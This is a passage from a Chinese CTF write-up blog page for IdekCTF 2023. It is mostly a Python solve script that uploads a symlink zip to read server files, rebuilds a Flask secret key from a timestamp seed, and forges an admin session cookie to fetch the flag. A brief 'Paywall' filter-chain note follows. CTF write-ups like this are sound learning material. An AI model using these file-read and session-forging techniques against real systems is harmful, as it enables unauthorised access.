class="string">&quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;&quot;</span></span><br><span class="line">log_url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    reg_url = baseurl + <span class="string">&quot;register&quot;</span></span><br><span class="line">    sess.post(reg_url, userinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    set_cookie = sess.post(baseurl + <span class="string">&quot;login&quot;</span>, data=userinfo, allow_redirects=<span class="literal">False</span>).headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">    cookie = set_cookie[<span class="number">8</span>:<span class="number">82</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">global</span> log_url</span><br><span class="line">    log_url = re.search(<span class="string">&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;</span>, sess.post(</span><br><span class="line">        baseurl + <span class="string">&quot;upload&quot;</span>, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;cookie&#125;</span>&#x27;</span>&#125;,</span><br><span class="line">        files=&#123;<span class="string">&#x27;file&#x27;</span>: base64.b64decode(pocZip)&#125;).text).group()[<span class="number">9</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    server_log = baseurl + log_url + <span class="string">&quot;/server.log&quot;</span></span><br><span class="line">    config = baseurl + log_url + <span class="string">&quot;/config.py&quot;</span></span><br><span class="line">    SECRET_OFFSET = <span class="built_in">int</span>(re.findall(<span class="string">&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;</span>, sess.get(config).text)[<span class="number">0</span>]) * <span class="number">1000</span></span><br><span class="line">    log = sess.get(server_log).text</span><br><span class="line">    now = (time.mktime(datetime.datetime.strptime(log.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:<span class="number">20</span>], <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timetuple())) * <span class="number">1000</span></span><br><span class="line">    <span class="keyword">return</span> SECRET_OFFSET,now</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    login()</span><br><span class="line">    upload()</span><br><span class="line">    SECRET_OFFSET, now = read()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        decoded = &#123;<span class="string">&#x27;admin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;uid&#x27;</span>: userinfo[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br><span class="line">        random.seed(<span class="built_in">round</span>(now + <span class="built_in">int</span>(SECRET_OFFSET)))</span><br><span class="line">        SECRET_KEY = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        flag_url = baseurl + <span class="string">&quot;flag&quot;</span></span><br><span class="line">        res = sess.get(flag_url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;flask_unsign.sign(decoded, SECRET_KEY)&#125;</span>&#x27;</span>&#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;idek&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h1><p>考点：Filterchain<br>使用探姬改的脚本就好了（挺好用的）<br> <img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678424133488-348df20b-e334-4e60-a12f-3bdb438407b0.png#averageHue=%23c6c6c6&clientId=uc45afee9-2314-4&from=paste&height=1054&id=uf1423b54&name=image.png&originHeight=1317&originWidth=2516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=141803&status=done&style=none&taskId=u37aa8a68-7584-4b72-9dd7-5f5629491f9&title=&width=2012.8" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/IdekCTF/" class="tag">#IdekCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/10/%E5%B4%AD%E6%96%B0%E5%87%BA%E5%8E%82%E7%9A%84Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">崭新出厂的Python原型链污染</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/10/KalmarCTF2023%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">KalmarCTF2023（部分）</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>